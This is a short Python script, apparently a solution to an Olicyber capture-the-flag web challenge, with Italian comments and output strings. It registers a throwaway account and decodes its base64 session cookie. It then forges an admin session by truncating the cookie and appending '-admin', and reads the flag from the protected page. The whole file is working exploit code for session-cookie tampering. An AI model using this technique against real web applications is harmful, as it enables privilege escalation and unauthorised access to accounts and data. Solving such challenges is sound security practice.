import requests as r 
import secrets
import base64
import urllib.parse
import re

session = r.Session()
url = 'http://cma.challs.olicyber.it/'

username = secrets.token_hex(8)
password = secrets.token_hex(8)

session.post(f"{url}index.php", data={'username': username, 'password': password, 'register': 'Arruolati'})
session.post(f"{url}index.php", data={'username': username, 'password': password, 'login': 'Log in'})

cookie_valore = session.cookies.get('session')
decodificato = base64.b64decode(urllib.parse.unquote(cookie_valore)).decode()

new_cookie = decodificato[:21] + '-admin'
new_cookie = base64.b64encode(new_cookie.encode()).decode()
new_cookie = urllib.parse.quote(new_cookie)

session.cookies.set('session', new_cookie)
response = session.get(f"{url}home.php")
response = response.text
match = re.search(r'flag\{.*?\}', response)

if match:
    flag = match.group()
    print(f"Flag trovata: {flag}")
else:
    print("Nessuna flag trovata nella pagina.")




